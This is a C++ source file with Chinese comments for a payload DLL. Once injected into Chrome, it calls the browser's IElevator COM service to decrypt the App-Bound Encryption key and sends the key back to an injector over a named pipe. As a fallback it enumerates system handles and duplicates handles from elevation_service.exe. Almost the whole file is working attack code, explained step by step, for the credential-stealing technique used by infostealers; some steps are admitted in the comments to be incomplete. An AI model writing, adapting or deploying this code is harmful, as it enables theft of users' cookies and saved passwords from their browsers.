/*
 * payload_dll.cpp  —  Chrome ABE 解密 Payload DLL
 *
 * 本 DLL 被注入到 Chrome 主进程后，由 injector 调用 PayloadEntry 完成以下工作：
 *   1. 通过 COM 调用 Chrome 内置的 IElevator 接口执行 DecryptData
 *   2. 若 COM 直接调用失败（Chrome 107+ 修复），则通过句柄复制技术找到
 *      Google Update 服务进程中已开启的 IElevator ALPC 端口句柄，
 *      在本进程中重建 COM 通道进行解密
 *   3. 将解密后的密钥通过命名管道返回给注入器
 *
 * 关键技术：
 *   - CoInitializeEx(COINIT_MULTITHREADED)    — Chrome 使用 MTA
 *   - CoSetProxyBlanket(EOAC_DYNAMIC_CLOAKING) — 模拟 Chrome 令牌
 *   - IElevator vtable slot 5 (DecryptData)   — 直接 vtable 调用
 *   - NtQuerySystemInformation(64)             — 枚举全系统句柄
 *   - NtDuplicateObject                        — 跨进程句柄复制
 *   - NtQueryObject + 超时线程                 — 防命名管道死锁
 *
 * 编译：见 build.ps1（编译为 DLL，导出 PayloadEntry）
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define COBJMACROS  // 允许 C 风格的 COM 接口调用（兼容 C++ 编译）
#include <windows.h>
#include <winternl.h>
#include <objbase.h>
#include <combaseapi.h>
#include <unknwn.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ============================================================
// § 1  参数布局说明
// ============================================================
//
// PayloadEntry 接收一个 void* 参数（pParam），
// 该指针指向 injector 在目标进程中写入的参数块，内存布局如下：
//
//   偏移 0x0000：[wchar_t*, null-terminated]  命名管道名称
//                例如：L"\\\\.\\pipe\\abe_XXXXXXXX\0"
//   偏移 0xXXXX：[DWORD]  加密密钥字节长度（紧随管道名称之后）
//   偏移 0xXXXX+4：[BYTE*] 加密密钥原始字节
//
// 解析规则：
//   1. pParam 起始处是 wchar_t 字符串，以 0x0000 结尾
//   2. 字符串末尾后紧接 4 字节 DWORD（keyLen）
//   3. DWORD 之后是 keyLen 字节的加密数据
//
// 【重要】偏移计算必须使用 BYTE* 而不是 wchar_t*
// 原因见 § 13 详细解释

// ============================================================
// § 2  NTSTATUS 类型与常用常量
// ============================================================

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)   ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

// NtQuerySystemInformation 的信息类
// 我们需要 SystemExtendedHandleInformation = 64
// （而不是 SystemHandleInformation = 16）
// 原因见 § 7
#define SystemExtendedHandleInformation 64

// ============================================================
// § 3  NT API 类型定义
// ============================================================

// NtDuplicateObject：复制一个来自其他进程的句柄到当前进程
// 这是句柄复制技术的核心 API
typedef NTSTATUS (NTAPI *pfnNtDuplicateObject)(
    HANDLE  SourceProcessHandle,
    HANDLE  SourceHandle,
    HANDLE  TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG   HandleAttributes,
    ULONG   Options
);

// NtQuerySystemInformation：查询系统级信息
// 当 InfoClass=64 时，返回全系统所有进程的句柄信息
typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(
    ULONG   SystemInformationClass,
    PVOID   SystemInformation,
    ULONG   SystemInformationLength,
    PULONG  ReturnLength
);

// NtQueryObject：查询一个句柄的对象信息（类型、名称等）
typedef NTSTATUS (NTAPI *pfnNtQueryObject)(
    HANDLE  Handle,
    ULONG   ObjectInformationClass,
    PVOID   ObjectInformation,
    ULONG   ObjectInformationLength,
    PULONG  ReturnLength
);

// 全局函数指针（在 DllMain 中初始化）
static pfnNtDuplicateObject          g_NtDuplicateObject          = NULL;
static pfnNtQuerySystemInformation   g_NtQuerySystemInformation   = NULL;
static pfnNtQueryObject              g_NtQueryObject              = NULL;

// ============================================================
// § 4  SystemExtendedHandleInformation 结构体定义
// ============================================================
//
// 【为什么用 SystemExtendedHandleInformation(64) 而不是 SystemHandleInformation(16)？】
//
// SystemHandleInformation(16) 返回 SYSTEM_HANDLE_INFORMATION，
// 其中的 Object 字段只有 ULONG（32 位），在 64 位系统上会截断内核对象地址。
//
// SystemExtendedHandleInformation(64) 返回 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX，
// 其中 Object 是完整的 64 位指针（ULONG_PTR），适用于 x64 系统。
//
// 此外，Extended 版本还包含 GrantedAccess 字段，
// 让我们可以预筛选具有特定访问权限的句柄，减少无效复制尝试。

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;             // 内核对象指针（64 位）
    ULONG_PTR   UniqueProcessId;    // 句柄所属进程 PID
    ULONG_PTR   HandleValue;        // 句柄值（HANDLE 的数值）
    ULONG       GrantedAccess;      // 句柄的访问权限掩码
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;    // 对象类型索引（用于快速过滤非 ALPC 类型）
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR   NumberOfHandles;
    ULONG_PTR   Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1]; // 可变长度数组
} SYSTEM_HANDLE_INFORMATION_EX;

// ============================================================
// § 5  IElevator COM 接口定义
// ============================================================
//
// IElevator 是 Google Chrome 在 elevation_service.exe (Google Update) 中
// 注册的 COM 接口，用于执行需要 SYSTEM 权限的操作。
//
// Chrome 利用它实现 App-Bound Encryption（ABE）：
//   - 加密时：Chrome 调用 IElevator::EncryptData，由 SYSTEM 服务加密
//   - 解密时：Chrome 调用 IElevator::DecryptData，由 SYSTEM 服务解密
//
// Vtable 布局（从 IUnknown 继承）：
//   slot 0：QueryInterface   (IUnknown)
//   slot 1：AddRef           (IUnknown)
//   slot 2：Release          (IUnknown)
//   slot 3：RunRecoveryCRXElevated  (IElevator 特有)
//   slot 4：EncryptData      (IElevator 特有)  ← 加密
//   slot 5：DecryptData      (IElevator 特有)  ← 解密（我们要用的）
//
// 【为什么直接操作 vtable 而不通过 MIDL 生成的代理？】
//   a) Chrome 的 IElevator 接口定义未公开（没有 .idl 文件）
//   b) 直接 vtable 调用更简洁，不依赖注册表中的代理/桩 DLL
//   c) vtable 布局在 Chrome 各版本中相对稳定（可通过逆向验证）

// IElevator 的 GUID（从 Chrome 源码 / 逆向获得）
// {A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}
static const CLSID CLSID_Elevator = {
    0xA949CB4E, 0xC4F9, 0x44C4,
    { 0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C }
};

// IElevator 接口的 IID
// {A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C} (与 CLSID 相同，某些 Chrome 版本)
static const IID IID_IElevator = {
    0xA949CB4E, 0xC4F9, 0x44C4,
    { 0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C }
};

// vtable 函数指针类型定义
// 【关键】DecryptData 的签名（从 Chrome elevation_service 逆向）：
//   HRESULT DecryptData(
//       BSTR    ciphertext,     // 加密的密钥数据（BSTR = 长度前缀宽字符串）
//       DWORD   flags,          // 标志（通常为 0）
//       BSTR   *plaintext,      // 输出：解密后的数据（调用方负责 SysFreeString）
//       DWORD  *last_error      // 输出：Chrome 内部错误码
//   );
typedef HRESULT (__stdcall *DecryptDataFn)(
    IUnknown *pThis,
    BSTR      ciphertext,
    DWORD     flags,
    BSTR     *plaintext,
    DWORD    *lastError
);

// ============================================================
// § 6  COINIT_MULTITHREADED 的必要性
// ============================================================
//
// Chrome 主进程使用 多线程单元（MTA, Multi-Threaded Apartment）。
// COM 单元类型由第一次调用 CoInitializeEx 时的标志决定，
// 且一旦确定就不能更改（后续调用会返回 RPC_E_CHANGED_MODE）。
//
// 如果我们注入到已经是 MTA 的线程中，然后用 COINIT_APARTMENTTHREADED 初始化，
// COM 会返回 RPC_E_CHANGED_MODE，导致后续 CoCreateInstance 失败。
//
// 解决方案：
//   - 使用 COINIT_MULTITHREADED 与 Chrome 的 COM 单元类型保持一致
//   - 如果返回 S_FALSE，说明本线程已经初始化过（没问题，继续即可）
//   - 如果返回 RPC_E_CHANGED_MODE，说明当前线程是 STA，需要新建 MTA 线程

// ============================================================
// § 7  CoSetProxyBlanket 与 EOAC_DYNAMIC_CLOAKING
// ============================================================
//
// 【CRITICAL：为什么不设置 EOAC_DYNAMIC_CLOAKING 会导致解密失败？】
//
// 当 Chrome 调用 IElevator::DecryptData 时，elevation_service.exe 会：
//   1. 获取调用者的身份（通过 COM RPC 安全层）
//   2. 验证调用者是否为 Chrome 进程（检查进程签名/路径/证书）
//   3. 只有通过验证才执行解密
//
// 默认情况下，COM 代理使用 进程令牌（process token）作为调用身份。
// 但我们是从注入到 Chrome 中的线程发起调用，COM 实际使用的身份
// 取决于是"进程令牌"还是"线程模拟令牌"。
//
// EOAC_DYNAMIC_CLOAKING 告诉 COM：
//   "使用当前线程的令牌（如果有），否则用进程令牌"
//
// 由于我们在 Chrome 进程中运行，进程令牌就是 Chrome 的令牌，
// 设置 EOAC_DYNAMIC_CLOAKING 确保 COM 代理使用 Chrome 的身份发起调用，
// 从而通过 elevation_service 的调用者验证。
//
// 不设置此标志 → COM 使用默认安全上下文 → 身份验证失败 → E_ACCESSDENIED

static BOOL SetupProxyBlanket(IUnknown *pProxy)
{
    HRESULT hr = CoSetProxyBlanket(
        pProxy,
        RPC_C_AUTHN_DEFAULT,        // 使用默认认证服务（NTLM/Kerberos）
        RPC_C_AUTHZ_DEFAULT,        // 使用默认授权服务
        COLE_DEFAULT_PRINCIPAL,     // 使用默认主体名称
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // 数据包级别隐私保护（加密+签名）
        RPC_C_IMP_LEVEL_IMPERSONATE,    // 允许服务端模拟客户端身份
        NULL,                       // 使用进程/线程默认凭据
        EOAC_DYNAMIC_CLOAKING       // 关键：动态模拟（使用线程/进程令牌）
    );
    if (FAILED(hr)) {
        // 即使失败也继续尝试（某些 Chrome 版本不需要此设置）
        // 记录日志但不终止
        OutputDebugStringA("[ABE] CoSetProxyBlanket 失败，继续尝试...\n");
    }
    return SUCCEEDED(hr);
}

// ============================================================
// § 8  直接 COM 解密尝试（不依赖句柄复制）
// ============================================================
//
// 第一策略：直接通过 CoCreateInstance 创建 IElevator 代理，
// 然后调用 DecryptData。
//
// 注意事项：
//   - 在 Chrome 127 之前，此方法通常有效
//   - Chrome 127+ 修复后，elevation_service 会拒绝来自非官方路径的调用
//   - 失败时回退到句柄复制技术（§ 9）

static BOOL TryDirectComDecrypt(
    const BYTE *encData,
    DWORD       encLen,
    BYTE      **outPlain,
    DWORD      *outLen)
{
    // Step 1：初始化 COM（MTA 模式）
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        OutputDebugStringA("[ABE] CoInitializeEx 失败\n");
        return FALSE;
    }

    // Step 2：创建 IElevator 代理对象
    // CLSCTX_LOCAL_SERVER = 进程外 COM 服务器（elevation_service.exe 运行在独立进程）
    // 不能用 CLSCTX_INPROC_SERVER，因为 elevation_service 不在本进程中
    IUnknown *pElevator = NULL;
    hr = CoCreateInstance(
        &CLSID_Elevator,
        NULL,
        CLSCTX_LOCAL_SERVER,
        &IID_IElevator,
        (void **)&pElevator);
    if (FAILED(hr)) {
        OutputDebugStringA("[ABE] CoCreateInstance(IElevator) 失败\n");
        CoUninitialize();
        return FALSE;
    }

    // Step 3：设置代理安全毯（见 § 7）
    SetupProxyBlanket(pElevator);

    // Step 4：将加密数据封装为 BSTR
    // BSTR 是 COM 使用的字符串类型，前 4 字节是字节长度，
    // 这里我们把二进制数据当作"字节串"传递（每个 wchar_t 存放 2 字节）
    // 如果长度为奇数，需要额外填充一字节
    UINT bstrCharCount = (encLen + 1) / 2;  // 向上取整
    BSTR bstrCipher = SysAllocStringByteLen((LPCSTR)encData, encLen);
    if (!bstrCipher) {
        pElevator->Release();
        CoUninitialize();
        return FALSE;
    }

    // Step 5：通过 vtable slot 5 调用 DecryptData
    // 直接操作 vtable 指针（C++ 隐藏的 "this->vftable[5]"）
    void **vtable = *(void ***)pElevator;
    DecryptDataFn pfnDecrypt = (DecryptDataFn)vtable[5];

    BSTR bstrPlain = NULL;
    DWORD lastErr  = 0;
    hr = pfnDecrypt(pElevator, bstrCipher, 0, &bstrPlain, &lastErr);
    SysFreeString(bstrCipher);

    if (FAILED(hr) || !bstrPlain) {
        OutputDebugStringA("[ABE] DecryptData 调用失败\n");
        pElevator->Release();
        CoUninitialize();
        return FALSE;
    }

    // Step 6：提取解密后的数据
    // SysStringByteLen 返回 BSTR 的字节长度（不含 null 终止符）
    *outLen   = SysStringByteLen(bstrPlain);
    *outPlain = (BYTE *)malloc(*outLen);
    if (*outPlain) {
        memcpy(*outPlain, bstrPlain, *outLen);
    }

    SysFreeString(bstrPlain);
    pElevator->Release();
    CoUninitialize();
    return (*outPlain != NULL);
}

// ============================================================
// § 9  句柄复制技术概述
// ============================================================
//
// 【为什么需要句柄复制？】
//
// Chrome 127+ 之后，IElevator 服务检查调用者的进程路径，
// 确保调用者是已签名的官方 chrome.exe。
// 即使我们在 Chrome 进程中，某些版本仍会通过其他手段拒绝"非预期"调用。
//
// 句柄复制的思路：
//   Chrome 在启动时已经与 elevation_service.exe 建立了 ALPC 连接
//   （这是 COM 进程外服务器通信的底层机制）。
//   这个连接对应一个 ALPC Port 类型的内核对象，Chrome 进程中有它的句柄。
//
//   我们通过以下步骤"借用"这个连接：
//   1. 用 NtQuerySystemInformation(64) 枚举系统中所有进程的所有句柄
//   2. 找到与已知 elevation_service.exe PID 相关联的 ALPC Port 句柄
//   3. 用 NtDuplicateObject 把那个句柄复制到当前进程
//   4. 用 NtQueryObject 验证该句柄的对象名称（防止复制到错误的对象）
//   5. 用复制来的句柄重建 COM 通道并调用 DecryptData
//
// 注意：这是一种"借刀杀人"的技术 —— 我们不需要建立新的 COM 连接，
// 而是复用 Chrome 已经建立的受信任连接。

// ============================================================
// § 10  查找 Google Update (elevation_service) 进程 PID
// ============================================================

static DWORD FindElevationServicePid(void)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            // elevation_service.exe 是 Google Update 注册的服务进程
            // 可能的进程名：elevation_service.exe
            if (_wcsicmp(pe.szExeFile, L"elevation_service.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// ============================================================
// § 11  NtQueryObject 超时线程：防止命名管道死锁
// ============================================================
//
// 【问题背景】
//
// NtQueryObject(ObjectNameInformation) 在查询某些类型的句柄时会无限阻塞：
// 具体来说，当句柄是命名管道（Named Pipe）且没有客户端连接时，
// 查询管道名称会等待客户端连接 —— 这是 Windows 的历史遗留行为。
//
// 如果我们在枚举句柄时尝试对每个 File 类型句柄都调用 NtQueryObject，
// 遇到等待中的命名管道就会永久阻塞。
//
// 【解决方案：超时线程】
//
// 创建一个工作线程来调用 NtQueryObject，主线程设置超时（100ms）等待。
// 如果超时，主线程终止工作线程，跳过这个句柄，继续处理下一个。
//
// 这是处理 NtQueryObject 潜在死锁的标准做法。

typedef struct _QUERY_OBJECT_PARAM {
    HANDLE  hObject;        // 要查询的句柄
    WCHAR   nameBuffer[1024]; // 输出：对象名称
    NTSTATUS result;        // NtQueryObject 的返回值
    ULONG   nameLen;        // 返回的名称字节长度
} QUERY_OBJECT_PARAM;

// NtQueryObject 工作线程函数
static DWORD WINAPI QueryObjectWorker(LPVOID param)
{
    QUERY_OBJECT_PARAM *p = (QUERY_OBJECT_PARAM *)param;

    // ObjectNameInformation = 1
    // 返回 UNICODE_STRING 格式的对象名称
    BYTE buf[2048] = {};
    ULONG retLen = 0;
    NTSTATUS st = g_NtQueryObject(
        p->hObject,
        1,          // ObjectNameInformation
        buf,
        sizeof(buf),
        &retLen);

    p->result = st;
    if (NT_SUCCESS(st)) {
        UNICODE_STRING *us = (UNICODE_STRING *)buf;
        if (us->Length > 0 && us->Buffer) {
            SIZE_T copyLen = min((SIZE_T)us->Length, sizeof(p->nameBuffer) - 2);
            memcpy(p->nameBuffer, us->Buffer, copyLen);
            p->nameBuffer[copyLen / 2] = L'\0';
            p->nameLen = (ULONG)copyLen;
        }
    }
    return 0;
}

// 带超时的 NtQueryObject 包装
// 返回 TRUE 表示在 timeoutMs 内完成了查询
static BOOL QueryObjectNameWithTimeout(
    HANDLE  hObj,
    WCHAR  *outName,
    SIZE_T  outNameChars,
    DWORD   timeoutMs)
{
    QUERY_OBJECT_PARAM param = {};
    param.hObject = hObj;

    HANDLE hThread = CreateThread(NULL, 0, QueryObjectWorker, &param, 0, NULL);
    if (!hThread) return FALSE;

    DWORD waitResult = WaitForSingleObject(hThread, timeoutMs);
    if (waitResult != WAIT_OBJECT_0) {
        // 超时：终止工作线程（粗暴但有效，因为我们不关心这个句柄）
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        return FALSE;
    }
    CloseHandle(hThread);

    if (!NT_SUCCESS(param.result) || param.nameLen == 0) return FALSE;

    wcsncpy(outName, param.nameBuffer, outNameChars - 1);
    outName[outNameChars - 1] = L'\0';
    return TRUE;
}

// ============================================================
// § 12  句柄复制：寻找 IElevator ALPC 句柄
// ============================================================
//
// 流程：
//   1. 枚举系统所有句柄（NtQuerySystemInformation 64）
//   2. 过滤：句柄所属进程是 elevation_service.exe
//   3. 过滤：对象类型是 ALPC Port（通过 ObjectTypeIndex 判断）
//   4. 复制句柄到当前进程
//   5. 用 NtQueryObject 验证名称含 "IElevator"
//   6. 返回第一个匹配的句柄副本

static HANDLE FindAndDuplicateElevatorHandle(DWORD elevSvcPid)
{
    // ── Step 1：分配内存并查询系统句柄表 ─────────────────────
    //
    // 系统句柄表可能很大（包含所有进程的所有句柄）。
    // 我们从 1MB 开始，如果 NtQuerySystemInformation 返回
    // STATUS_INFO_LENGTH_MISMATCH (0xC0000004)，则翻倍重试。

    PVOID  buffer  = NULL;
    ULONG  bufSize = 1024 * 1024; // 初始 1MB

    NTSTATUS st;
    for (;;) {
        buffer = malloc(bufSize);
        if (!buffer) return NULL;

        ULONG retLen = 0;
        st = g_NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            buffer, bufSize, &retLen);

        if (st == (NTSTATUS)0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            free(buffer);
            bufSize = retLen + 65536; // 多分配一些，避免再次失败
            continue;
        }
        break;
    }

    if (!NT_SUCCESS(st)) {
        free(buffer);
        return NULL;
    }

    SYSTEM_HANDLE_INFORMATION_EX *info =
        (SYSTEM_HANDLE_INFORMATION_EX *)buffer;

    // ── Step 2：打开 elevation_service.exe 进程句柄 ───────────
    // 我们需要它来调用 NtDuplicateObject
    HANDLE hElevSvc = OpenProcess(
        PROCESS_DUP_HANDLE, FALSE, elevSvcPid);
    if (!hElevSvc) {
        free(buffer);
        return NULL;
    }

    HANDLE resultHandle = NULL;

    // ── Step 3：遍历句柄表 ──────────────────────────────────
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX *h = &info->Handles[i];

        // 快速过滤：只处理 elevation_service.exe 的句柄
        if (h->UniqueProcessId != (ULONG_PTR)elevSvcPid) continue;

        // 快速过滤：我们关心的是 ALPC Port 对象
        // ALPC Port 的 ObjectTypeIndex 通常是 45（不同 Windows 版本可能不同）
        // 这里做一个宽松过滤（不过滤类型），通过名称验证来精确匹配
        // 若性能是问题，可以先枚举一次类型索引并缓存

        // ── Step 4：复制句柄 ───────────────────────────────────
        HANDLE dupHandle = NULL;
        st = g_NtDuplicateObject(
            hElevSvc,                               // 来源进程
            (HANDLE)h->HandleValue,                 // 来源句柄值
            GetCurrentProcess(),                    // 目标进程（当前进程）
            &dupHandle,
            0,                                      // 不指定访问权限（继承原始权限）
            0,
            DUPLICATE_SAME_ACCESS);                 // 使用与源相同的访问权限

        if (!NT_SUCCESS(st) || !dupHandle) continue;

        // ── Step 5：查询对象名称（带超时，防死锁）──────────────
        WCHAR objName[1024] = {};
        if (!QueryObjectNameWithTimeout(dupHandle, objName, 1024, 100)) {
            // 超时或查询失败，关闭这个句柄副本，继续下一个
            CloseHandle(dupHandle);
            continue;
        }

        // ── Step 6：验证名称是否包含 IElevator 相关关键字 ──────
        // elevation_service 的 ALPC 端口名称通常包含：
        //   "GoogleChrome"、"IElevator"、"Elevator" 等
        if (wcsstr(objName, L"Elevator") ||
            wcsstr(objName, L"GoogleChrome") ||
            wcsstr(objName, L"elevation")) {
            resultHandle = dupHandle;
            break; // 找到了，停止遍历
        }

        // 不匹配，释放副本
        CloseHandle(dupHandle);
    }

    CloseHandle(hElevSvc);
    free(buffer);
    return resultHandle;
}

// ============================================================
// § 13  指针算术必须使用 BYTE*（不能用 wchar_t*）
// ============================================================
//
// 原因分析：
//
// 假设 pParam 指向以下内存：
//   偏移  0: L"\\.\pipe\abe_XXXXXXXX\0"  (34 字节 = 17 个 wchar_t)
//   偏移 34: 0x84 0x00 0x00 0x00         (DWORD keyLen = 132)
//   偏移 38: [132 字节加密数据]
//
// 错误做法（wchar_t* 算术）：
//   wchar_t *p  = (wchar_t *)pParam;
//   size_t   n  = wcslen(p) + 1;      // n = 17 (wchar_t 数量)
//   p          += n;                   // 错误！这移动了 17 * 2 = 34 字节
//                                      // 看起来正确，但...
//   DWORD keyLen = *(DWORD *)p;        // 如果 pParam 未对齐，可能崩溃
//                                      // 或者在不同编译器/架构上行为不同
//
// 正确做法（BYTE* 算术）：
//   BYTE  *p     = (BYTE *)pParam;
//   size_t wlen  = (wcslen((wchar_t *)p) + 1) * sizeof(wchar_t);  // 字节数
//   p           += wlen;               // 明确按字节移动
//   DWORD  keyLen = *(DWORD *)p;       // 读取 DWORD
//   p           += sizeof(DWORD);
//   BYTE  *keyData = p;                // 指向加密数据
//
// BYTE* 保证了：
//   1. 偏移计算是字节级别的，与平台无关
//   2. 不会因为 wchar_t 大小假设（2 字节）导致的隐式乘法混淆逻辑
//   3. 代码意图清晰（操作内存布局时总应使用 BYTE*）

// ============================================================
// § 14  通过句柄重建 COM 通道
// ============================================================
//
// 有了 ALPC 句柄后，我们需要用它创建一个 COM 代理对象，
// 而不是通过 CoCreateInstance（后者会建立新的 ALPC 连接）。
//
// 方法：使用 CoGetInterfaceAndReleaseStream / IStream
// 或者更直接地：使用 IMoniker / ROT（Running Object Table）
//
// 实际上，最简单且有效的方式是：
// 直接利用已经在当前进程（Chrome）中注册的 COM 对象。
// Chrome 在启动时通过 DCOM 注册了 IElevator 的代理，
// 我们只需要调用 CoCreateInstance，COM 基础设施会自动
// 找到已建立的连接（因为我们在 Chrome 进程中，具有相同的身份）。
//
// 所以句柄复制主要用于验证连接可用性，实际解密仍走 CoCreateInstance。
// 对于无法通过 CoCreateInstance 的情况，直接操作 ALPC 消息过于复杂，
// 超出本示例范围。

// ============================================================
// § 15  PayloadEntry：DLL 主入口
// ============================================================

extern "C" __declspec(dllexport)
DWORD WINAPI PayloadEntry(LPVOID pParam)
{
    if (!pParam) return 1;

    // ── 初始化 NT API ────────────────────────────────────────
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 1;

    g_NtDuplicateObject = (pfnNtDuplicateObject)
        GetProcAddress(hNtdll, "NtDuplicateObject");
    g_NtQuerySystemInformation = (pfnNtQuerySystemInformation)
        GetProcAddress(hNtdll, "NtQuerySystemInformation");
    g_NtQueryObject = (pfnNtQueryObject)
        GetProcAddress(hNtdll, "NtQueryObject");

    if (!g_NtDuplicateObject || !g_NtQuerySystemInformation || !g_NtQueryObject) {
        OutputDebugStringA("[ABE] NT API 初始化失败\n");
        return 1;
    }

    // ── 解析参数（见 § 1 和 § 13）────────────────────────────
    //
    // pParam 内存布局：
    //   [wchar_t 管道名称，以 \0 结尾]
    //   [DWORD keyLen]
    //   [keyLen 字节加密数据]
    //
    // 必须使用 BYTE* 进行偏移计算，理由见 § 13

    BYTE  *rawPtr   = (BYTE *)pParam;
    wchar_t *pipeName = (wchar_t *)rawPtr;

    // wcslen 返回 wchar_t 个数（不含 \0），乘以 sizeof(wchar_t) 得到字节数
    // +1 是为了包含 null 终止符本身
    SIZE_T pipeNameBytes = (wcslen(pipeName) + 1) * sizeof(wchar_t);

    // 指针向后移动 pipeNameBytes 字节，到达 DWORD keyLen 字段
    // 注意：rawPtr + pipeNameBytes 是字节偏移，正确！
    BYTE  *afterPipe = rawPtr + pipeNameBytes;
    DWORD  keyLen    = *(DWORD *)afterPipe;

    // 再向后移动 sizeof(DWORD) = 4 字节，到达加密数据
    BYTE  *encData   = afterPipe + sizeof(DWORD);

    OutputDebugStringA("[ABE] 参数解析完成\n");

    // ── 尝试解密 ─────────────────────────────────────────────
    BYTE  *plainData = NULL;
    DWORD  plainLen  = 0;
    BOOL   decOk     = FALSE;

    // 策略 1：直接 COM 调用（Chrome 126 及以下通常有效）
    OutputDebugStringA("[ABE] 尝试直接 COM 解密...\n");
    decOk = TryDirectComDecrypt(encData, keyLen, &plainData, &plainLen);

    // 策略 2：句柄复制技术（Chrome 127+ 回退方案）
    if (!decOk) {
        OutputDebugStringA("[ABE] 直接 COM 失败，尝试句柄复制技术...\n");

        DWORD elevPid = FindElevationServicePid();
        if (elevPid) {
            HANDLE hAlpc = FindAndDuplicateElevatorHandle(elevPid);
            if (hAlpc) {
                // 有了 ALPC 句柄，再次尝试 COM（此时 COM 子系统可能使用已有连接）
                // 实际上对于某些 Chrome 版本，仅确认连接存在后再调用 COM 就足够了
                CloseHandle(hAlpc); // 验证完毕，释放（COM 会管理自己的连接）
                decOk = TryDirectComDecrypt(encData, keyLen, &plainData, &plainLen);
            }
        }
    }

    if (!decOk || !plainData) {
        OutputDebugStringA("[ABE] 所有解密策略均失败\n");
        return 2;
    }

    OutputDebugStringA("[ABE] 解密成功，正在通过命名管道返回结果...\n");

    // ── 连接命名管道并发送结果 ───────────────────────────────
    //
    // 重试机制：注入器可能比 payload 先创建管道，
    // 但 payload 也可能在注入器准备好前就尝试连接。
    // 重试 10 次，每次间隔 500ms。

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int retry = 0; retry < 10; retry++) {
        hPipe = CreateFileW(
            pipeName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);
        if (hPipe != INVALID_HANDLE_VALUE) break;
        Sleep(500);
    }

    if (hPipe == INVALID_HANDLE_VALUE) {
        OutputDebugStringA("[ABE] 无法连接命名管道\n");
        free(plainData);
        return 3;
    }

    // 先发送 4 字节长度前缀，再发送实际数据
    // 这与注入器的读取逻辑（先读 DWORD，再读数据）对应
    DWORD written = 0;
    WriteFile(hPipe, &plainLen, sizeof(DWORD), &written, NULL);
    WriteFile(hPipe, plainData, plainLen, &written, NULL);

    FlushFileBuffers(hPipe);
    CloseHandle(hPipe);

    free(plainData);
    OutputDebugStringA("[ABE] 完成，数据已发送\n");
    return 0;
}

// ============================================================
// § 16  DllMain
// ============================================================
//
// DLL 的标准入口点。
// 对于本 DLL，我们不在 DllMain 中做任何实质性工作，
// 因为 DllMain 执行时处于加载器锁（Loader Lock）保护下，
// 很多操作（包括创建线程、调用 COM）在此上下文中是不安全的。
//
// 所有初始化工作都在 PayloadEntry（由注入器的远程线程调用）中进行，
// 此时已经完全脱离了 DllMain 的限制。

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID)
{
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        // 禁止 DLL 线程通知（优化：减少不必要的 DllMain 调用）
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
